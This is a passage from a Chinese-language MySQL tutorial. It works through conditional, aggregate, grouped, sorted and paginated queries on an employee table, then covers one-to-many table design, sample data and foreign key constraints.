<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 方式1：使用or连接多个条件</span></span><br><span class="line"><span class="keyword">select</span> id, username, password, name, gender, image, job, entrydate, create_time, update_time</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">where</span> job<span class="operator">=</span><span class="number">2</span> <span class="keyword">or</span> job<span class="operator">=</span><span class="number">3</span> <span class="keyword">or</span> job<span class="operator">=</span><span class="number">4</span>; </span><br><span class="line"><span class="comment">-- 方式2：in关键字</span></span><br><span class="line"><span class="keyword">select</span> id, username, password, name, gender, image, job, entrydate, create_time, update_time</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">where</span> job <span class="keyword">in</span> (<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>); <span class="comment">--</span></span><br></pre></td></tr></table></figure>
<ul>
<li>案例9：查询 姓名 为两个字的员工信息</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, username, password, name, gender, image, job, entrydate, create_time, update_time</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;__&#x27;</span>;  </span><br><span class="line"><span class="comment">-- 通配符 &quot;_&quot; 代表任意1个字符</span></span><br></pre></td></tr></table></figure>
<ul>
<li>案例10：查询 姓 ‘张’ 的员工信息</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, username, password, name, gender, image, job, entrydate, create_time, update_time</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;张%&#x27;</span>; </span><br><span class="line"><span class="comment">-- 通配符 &quot;%&quot; 代表任意个字符（0个 ~ 多个）</span></span><br></pre></td></tr></table></figure>
<h4 id="聚合函数"><a class="header-anchor" href="#聚合函数">¶</a>聚合函数</h4>
<ul>
<li>聚合函数查询→纵向查询</li>
<li>对<strong>一列的值</strong>进行计算，然后返回<strong>一个结果值</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 聚合函数（字段列表） <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure>
<blockquote>
<p>聚合函数会忽略空值，对NULL值不作为统计</p>
</blockquote>
<table>
<thead>
<tr>
<th>函数</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>count</td>
<td>统计数量</td>
</tr>
<tr>
<td>max</td>
<td>最大值</td>
</tr>
<tr>
<td>min</td>
<td>最小值</td>
</tr>
<tr>
<td>avg</td>
<td>平均值</td>
</tr>
<tr>
<td>sum</td>
<td>求和</td>
</tr>
</tbody>
</table>
<blockquote>
<p>count ：按照列去统计有多少行数据。</p>
<ul>
<li>在根据指定的列统计的时候，如果这一列中有null的行，该行不会被统计在其中。</li>
</ul>
<p>sum ：计算指定列的数值和，如果不是数值类型，那么计算结果为0</p>
<p>max ：计算指定列的最大值</p>
<p>min ：计算指定列的最小值</p>
<p>avg ：计算指定列的平均值</p>
</blockquote>
<ul>
<li>案例1：统计该企业员工数量</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- count(*)  推荐此写法（MySQL底层进行了优化）</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> tb_emp;</span><br></pre></td></tr></table></figure>
<ul>
<li>案例2：统计该企业最早入职的员工</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(entrydate) <span class="keyword">from</span> tb_emp;</span><br></pre></td></tr></table></figure>
<h4 id="分组查询"><a class="header-anchor" href="#分组查询">¶</a>分组查询</h4>
<ul>
<li>分组： 按照某一列或者某几列，把相同的数据进行合并输出</li>
</ul>
<blockquote>
<p>按列进行分类(指定列下相同的数据归为一类)，然后可以对分类完的数据进行合并计算</p>
<p>通常使用聚合函数进行计算</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段列表 </span><br><span class="line"><span class="keyword">from</span> 表名 </span><br><span class="line">[ <span class="keyword">where</span> 分组前条件 ] </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> 分组字段名</span><br><span class="line">[ <span class="keyword">having</span> 分组后过滤条件 ];</span><br></pre></td></tr></table></figure>
<ul>
<li>案例1：根据性别分组，统计男性和女性员工的数量</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> gender, <span class="built_in">count</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> gender;</span><br><span class="line"><span class="comment">-- 按照gender字段进行分组</span></span><br><span class="line"><span class="comment">--（gender字段下相同的数据归为一组）</span></span><br></pre></td></tr></table></figure>
<ul>
<li>案例2：查询入职时间在 ‘2015-01-01’ (包含) 以前的员工 , 并对结果根据职位分组 , 获取员工数量大于等于2的职位</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> job, <span class="built_in">count</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">where</span> entrydate <span class="operator">&lt;=</span> <span class="string">&#x27;2015-01-01&#x27;</span>  <span class="comment">-- 分组前条件</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> job  <span class="comment">-- 按照job字段分组</span></span><br><span class="line"><span class="keyword">having</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">2</span>;  <span class="comment">-- 分组后条件</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>注意</strong>:</p>
<p>分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义</p>
<p>执行顺序：where &gt; 聚合函数 &gt; having</p>
</blockquote>
<h5 id="面试题：where和having的区别"><a class="header-anchor" href="#面试题：where和having的区别">¶</a>面试题：where和having的区别</h5>
<ul>
<li><strong><u>执行时机不同</u></strong>：
<ul>
<li>where是<strong>分组之前</strong>进行过滤，不满足where条件，不参与分组</li>
<li>而having是<strong>分组之后</strong>对结果进行过滤</li>
</ul>
</li>
<li><strong><u>判断条件不同</u></strong>：
<ul>
<li>where不能对聚合函数进行判断</li>
<li>having可以</li>
</ul>
</li>
</ul>
<h4 id="排序查询"><a class="header-anchor" href="#排序查询">¶</a>排序查询</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段列表</span><br><span class="line"><span class="keyword">from</span> 表名</span><br><span class="line">[ <span class="keyword">where</span> 条件列表 ]</span><br><span class="line">[ <span class="keyword">group</span> <span class="keyword">by</span> 分组字段 ]</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 字段<span class="number">1</span> 排序方式<span class="number">1</span>, 字段<span class="number">2</span> 排序方式<span class="number">2</span> ...;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>排序方式：</p>
<p>ASC ：升序（默认值）</p>
<p>DESC：降序</p>
</blockquote>
<ul>
<li>案例3：根据入职时间对公司的员工进行升序排序，入职时间相同，再按照更新时间进行降序排序</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, username, password, name, gender, image, job, entrydate, create_time, update_time</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> entrydate <span class="keyword">ASC</span>, update_time <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>注意</strong>：</p>
<p>如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序</p>
</blockquote>
<h4 id="分页查询"><a class="header-anchor" href="#分页查询">¶</a>分页查询</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段列表 <span class="keyword">from</span> 表名 limit 起始索引, 查询记录数;</span><br></pre></td></tr></table></figure>
<ul>
<li>案例1：从起始索引0开始查询员工数据, 每页展示5条记录</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, username, password, name, gender, image, job, entrydate, create_time, update_time</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line">limit <span class="number">0</span>, <span class="number">5</span>;  <span class="comment">-- 从索引0开始，向后取5条记录</span></span><br></pre></td></tr></table></figure>
<ul>
<li>案例2：查询 第1页 员工数据, 每页展示5条记录</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, username, password, name, gender, image, job, entrydate, create_time, update_time</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line">limit <span class="number">5</span>;</span><br><span class="line"><span class="comment">-- 如果查询的是第1页数据，起始索引可省略</span></span><br><span class="line"><span class="comment">-- 直接简写为limit条数</span></span><br></pre></td></tr></table></figure>
<ul>
<li>案例3：查询 第2页 员工数据, 每页展示5条记录</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">....</span><br><span class="line">limit <span class="number">5</span>, <span class="number">5</span>;  <span class="comment">-- 从索引5开始，向后取5条记录</span></span><br></pre></td></tr></table></figure>
<ul>
<li>案例4：查询 第3页 员工数据, 每页展示5条记录</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">....</span><br><span class="line">limit <span class="number">10</span>, <span class="number">5</span>;  <span class="comment">-- 从索引10开始，向后取5条记录</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
<li>
<p>起始索引从0开始。</p>
<p>计算公式 ：   起始索引 = （查询页码 - 1）* 每页显示记录数</p>
</li>
<li>
<p>分页查询是数据库的方言，不同的数据库有不同的实现，MySQL中是LIMIT</p>
</li>
<li>
<p>如果查询的是第一页数据，起始索引可以省略，直接简写为 limit  条数</p>
</li>
</ol>
</blockquote>
<h4 id="案例"><a class="header-anchor" href="#案例">¶</a>案例</h4>
<ul>
<li>案例1：</li>
</ul>
<blockquote>
<p>分析：根据输入的条件，查询第1页数据</p>
<ol>
<li>在员工管理的列表上方有一些查询条件：员工姓名、员工性别，员工入职时间(开始时间~结束时间)
<ol>
<li>姓名：张</li>
<li>性别：男</li>
<li>入职时间：2000-01-01  ~  2015-12-31</li>
</ol>
</li>
<li>除了查询条件外，在列表的下面还有一个分页条，这就涉及到了分页查询
<ol>
<li>查询第1页数据（每页显示10条数据）</li>
</ol>
</li>
<li>基于查询的结果，按照修改时间进行降序排序</li>
</ol>
<p>结论：条件查询 + 分页查询 + 排序查询</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 根据输入条件查询第1页数据（每页展示10条记录）</span></span><br><span class="line"><span class="comment">-- 输入条件：</span></span><br><span class="line">   <span class="comment">-- 姓名：张 （模糊查询）</span></span><br><span class="line">   <span class="comment">-- 性别：男</span></span><br><span class="line">   <span class="comment">-- 入职时间：2000-01-01 ~ 2015-12-31</span></span><br><span class="line"><span class="comment">-- 分页： 0 , 10</span></span><br><span class="line"><span class="comment">-- 排序： 修改时间  DESC</span></span><br><span class="line"><span class="keyword">select</span> id, username, password, name, gender, image, job, entrydate, create_time, update_time</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;张%&#x27;</span> <span class="keyword">and</span> gender <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> entrydate bwtween <span class="string">&#x27;2000-01-01&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;2015-12-31&#x27;</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> update_time <span class="keyword">desc</span></span><br><span class="line">limit <span class="number">0</span>, <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>案例2：</li>
</ul>
<blockquote>
<p>分析：以上信息统计在开发中也叫图形报表(将统计好的数据以可视化的形式展示出来)</p>
<p>员工性别统计：以饼状图的形式展示出企业男性员工人数和女性员工人数</p>
<p>只要查询出男性员工和女性员工各自有多少人就可以了</p>
<p>员工职位统计：以柱状图的形式展示各职位的在岗人数</p>
<p>只要查询出各个职位有多少人就可以了</p>
</blockquote>
<ul>
<li>员工性别统计：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- if(条件表达式, true取值 , false取值)</span></span><br><span class="line"><span class="keyword">select</span> if(gender<span class="operator">=</span><span class="number">1</span>,<span class="string">&#x27;男性员工&#x27;</span>,<span class="string">&#x27;女性员工&#x27;</span>) <span class="keyword">AS</span> 性别, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">AS</span> 人数</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> gender;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>if(表达式, tvalue, fvalue) ：当表达式为true时，取值tvalue；当表达式为false时，取值fvalue</p>
</blockquote>
<ul>
<li>员工职位统计：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- case 表达式 when 值1 then 结果1  when 值2  then  结果2 ...  else  result  end</span></span><br><span class="line"><span class="keyword">select</span> (<span class="keyword">case</span> job</span><br><span class="line">             <span class="keyword">when</span> <span class="number">1</span> <span class="keyword">then</span> <span class="string">&#x27;班主任&#x27;</span></span><br><span class="line">             <span class="keyword">when</span> <span class="number">2</span> <span class="keyword">then</span> <span class="string">&#x27;讲师&#x27;</span></span><br><span class="line">             <span class="keyword">when</span> <span class="number">3</span> <span class="keyword">then</span> <span class="string">&#x27;学工主管&#x27;</span></span><br><span class="line">             <span class="keyword">when</span> <span class="number">4</span> <span class="keyword">then</span> <span class="string">&#x27;教研主管&#x27;</span></span><br><span class="line">             <span class="keyword">else</span> <span class="string">&#x27;未分配职位&#x27;</span></span><br><span class="line">        <span class="keyword">end</span>) <span class="keyword">AS</span> 职位 ,</span><br><span class="line">       <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">AS</span> 人数</span><br><span class="line"><span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> job;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>case   表达式    when   值1   then  结果1   when 值2  then  结果2 …     end</p>
</blockquote>
<h3 id="多表设计"><a class="header-anchor" href="#多表设计">¶</a>多表设计</h3>
<ul>
<li>业务之间相互关联，所以各个表结构之间也存在着各种联系</li>
<li>表结构关系分为三种：
<ul>
<li>一对多(多对一)</li>
<li>多对多</li>
<li>一对一</li>
</ul>
</li>
</ul>
<h4 id="一对多"><a class="header-anchor" href="#一对多">¶</a>一对多</h4>
<h5 id="表设计"><a class="header-anchor" href="#表设计">¶</a>表设计</h5>
<blockquote>
<p>已明确的部门表结构：</p>
<ul>
<li>业务字段 ： 部门名称</li>
<li>基础字段 ： id(主键)、创建时间、修改时间</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 建议：创建新的数据库（多表设计存放在新数据库下）</span></span><br><span class="line"><span class="keyword">create</span> database db03;</span><br><span class="line">use db03;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 部门表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_dept</span><br><span class="line">(</span><br><span class="line">    id <span class="type">int</span> unsigned <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span>  comment <span class="string">&#x27;部门名称&#x27;</span>,</span><br><span class="line">    create_time datetime <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time datetime <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;修改时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;部门表&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>部门表创建后，还需要再修改员工表</p>
<ul>
<li>∵设计员工表(单表)的时候，并没有考虑员工的归属部门</li>
</ul>
</li>
<li>
<p>员工表：添加归属部门字段</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 员工表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_emp</span><br><span class="line">(</span><br><span class="line">    id          <span class="type">int</span> unsigned <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">    username    <span class="type">varchar</span>(<span class="number">20</span>)      <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span> comment <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">    password    <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">default</span> <span class="string">&#x27;123456&#x27;</span> comment <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">    name        <span class="type">varchar</span>(<span class="number">10</span>)      <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    gender      tinyint unsigned <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;性别, 说明: 1 男, 2 女&#x27;</span>,</span><br><span class="line">    image       <span class="type">varchar</span>(<span class="number">300</span>) comment <span class="string">&#x27;图像&#x27;</span>,</span><br><span class="line">    job         tinyint unsigned comment <span class="string">&#x27;职位, 说明: 1 班主任,2 讲师, 3 学工主管, 4 教研主管&#x27;</span>,</span><br><span class="line">    entrydate   <span class="type">date</span> comment <span class="string">&#x27;入职时间&#x27;</span>,</span><br><span class="line">    dept_id     <span class="type">int</span> unsigned comment <span class="string">&#x27;部门ID&#x27;</span>, <span class="comment">-- 员工的归属部门</span></span><br><span class="line">    create_time datetime         <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time datetime         <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;修改时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;员工表&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>测试数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 部门表测试数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_dept (id, name, create_time, update_time) <span class="keyword">values</span></span><br><span class="line">(<span class="number">1</span>,<span class="string">&#x27;学工部&#x27;</span>,now(),now()),</span><br><span class="line">(<span class="number">2</span>,<span class="string">&#x27;教研部&#x27;</span>,now(),now()),</span><br><span class="line">(<span class="number">3</span>,<span class="string">&#x27;咨询部&#x27;</span>,now(),now()),</span><br><span class="line">(<span class="number">4</span>,<span class="string">&#x27;就业部&#x27;</span>,now(),now()),</span><br><span class="line">(<span class="number">5</span>,<span class="string">&#x27;人事部&#x27;</span>,now(),now());</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 员工表测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tb_emp</span><br><span class="line">(id, username, password, name, gender, image, job, entrydate,dept_id, create_time, update_time) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>,<span class="string">&#x27;jinyong&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;金庸&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;1.jpg&#x27;</span>,<span class="number">4</span>,<span class="string">&#x27;2000-01-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">2</span>,<span class="string">&#x27;zhangwuji&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;张无忌&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2015-01-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">3</span>,<span class="string">&#x27;yangxiao&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;杨逍&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;3.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2008-05-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">4</span>,<span class="string">&#x27;weiyixiao&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;韦一笑&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;4.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2007-01-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">5</span>,<span class="string">&#x27;changyuchun&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;常遇春&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;5.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2012-12-05&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">6</span>,<span class="string">&#x27;xiaozhao&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;小昭&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;6.jpg&#x27;</span>,<span class="number">3</span>,<span class="string">&#x27;2013-09-05&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">7</span>,<span class="string">&#x27;jixiaofu&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;纪晓芙&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;7.jpg&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2005-08-01&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">8</span>,<span class="string">&#x27;zhouzhiruo&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;周芷若&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;8.jpg&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2014-11-09&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">9</span>,<span class="string">&#x27;dingminjun&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;丁敏君&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;9.jpg&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2011-03-11&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">10</span>,<span class="string">&#x27;zhaomin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;赵敏&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;10.jpg&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2013-09-05&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">11</span>,<span class="string">&#x27;luzhangke&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;鹿杖客&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;11.jpg&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2007-02-01&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">12</span>,<span class="string">&#x27;hebiweng&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;鹤笔翁&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;12.jpg&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2008-08-18&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">13</span>,<span class="string">&#x27;fangdongbai&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;方东白&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;13.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2012-11-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">14</span>,<span class="string">&#x27;zhangsanfeng&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;张三丰&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;14.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2002-08-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">15</span>,<span class="string">&#x27;yulianzhou&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;俞莲舟&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;15.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2011-05-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">16</span>,<span class="string">&#x27;songyuanqiao&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;宋远桥&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;16.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2010-01-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">17</span>,<span class="string">&#x27;chenyouliang&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;陈友谅&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;17.jpg&#x27;</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;2015-03-21&#x27;</span>,<span class="keyword">NULL</span>,now(),now());</span><br></pre></td></tr></table></figure>
<ul>
<li><code>员工表-部门表</code>之间的关系
<ul>
<li><code>员工表tb_emp</code>作为子表</li>
<li><code>部门表tb_dept</code>作为父表</li>
<li><code>员工表tb_emp</code>的<code>dept_id</code>（多）对应<code>部门表tb_dept</code>的<code>id</code>（一）</li>
</ul>
</li>
</ul>
<h5 id="外键约束"><a class="header-anchor" href="#外键约束">¶</a>外键约束</h5>
<ul>
<li>
<p>背景：</p>
<ul>
<li><code>员工表tb_emp</code>的<code>dept_id</code>（多）对应<code>部门表tb_dept</code>的<code>id</code>（一）</li>
</ul>
</li>
<li>
<p>问题：</p>
<ul>
<li>上述的两张表(员工表、部门表)，在<strong>数据库层面</strong>，并未建立关联</li>
<li>无法保证数据的一致性和完整性</li>
</ul>
</li>
<li>
<p>解决：</p>
<ul>
<li><strong>外键约束</strong></li>
</ul>
<blockquote>
<p>外键约束：让两张表的数据建立连接，保证数据的一致性和完整性。</p>
<p>对应的关键字：foreign key</p>
</blockquote>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建表时指定</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">    字段名    数据类型,</span><br><span class="line">    ...</span><br><span class="line">    [<span class="keyword">constraint</span>]   [外键名称]  <span class="keyword">foreign</span>  key (外键字段名)   <span class="keyword">references</span>   主表 (主表列名)    </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 建完表后，添加外键</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span>  表名  <span class="keyword">add</span> <span class="keyword">constraint</span>  外键名称  <span class="keyword">foreign</span> key(外键字段名) <span class="keyword">references</span> 主表(主表列名);</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>解决方案：为员工表的<code>dept_id </code>建立外键约束，来关联部门表的主键</p>
</li>
<li>
<p>方式1：通过SQL语句操作</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 修改表： 添加外键约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb_emp  </span><br><span class="line"><span class="keyword">add</span>  <span class="keyword">constraint</span>  fk_dept_id  <span class="keyword">foreign</span> key (dept_id)  <span class="keyword">references</span>  tb_dept(id);</span><br></pre></td></tr></table></figure>
<ul>
<li>方式2：图形化界面操作
<ul>
<li>右键表名→<code>Modify Table</code>→<code>Foreign Key</code></li>
<li><code>Name</code>→外键约束名字</li>
<li><code>Target table</code>→目标表（主表）</li>
<li><code>From</code> 外键字段</li>
<li><code>To</code> 主表主键</li>
<li>填写完成后点击<code>Execute</code></li>
</ul>
</li>
</ul>
<blockquote>
<p>添加外键约束时，需要保证当前数据库表中的数据时完整的</p>
<p>外键约束（foreign key）：保证了数据的完整性和一致性</p>
</blockquote>
<h6 id="物理外键和逻辑外键"><a class="header-anchor" href="#物理外键和逻辑外键">¶</a>物理外键和逻辑外键</h6>
<ul>
<li>
<p>物理外键</p>
<ul>
<li>概念：使用<code>foreign key</code>定义外键关联另一张表</li>
<li>缺点：
<ul>
<li>影响增、删、改的效率（需要检查外键关系）</li>
<li>仅用于单节点数据库，不适用与分布式、集群场景</li>
<li>容易引发数据库的死锁问题，消耗性能</li>
</ul>
</li>
</ul>
</li>
<li>
<p>逻辑外键</p>
<ul>
<li>概念：在业务层逻辑中，解决外键关联</li>
</ul>
</li>
</ul>
<blockquote>
<p>现在的企业开发中，很少会使用物理外键，都是使用逻辑外键。 甚至在一些数据库开发规范中，会明确指出禁止使用物理外键 foreign key</p>
</blockquote>
<h4 id="一对一"><a class="header-anchor" href="#一对一">¶</a>一对一</h4>
<ul>
<li>
<p>通常是用做<strong>单表的拆分</strong>，即将一张大表拆分成两张小表</p>
</li>
<li>
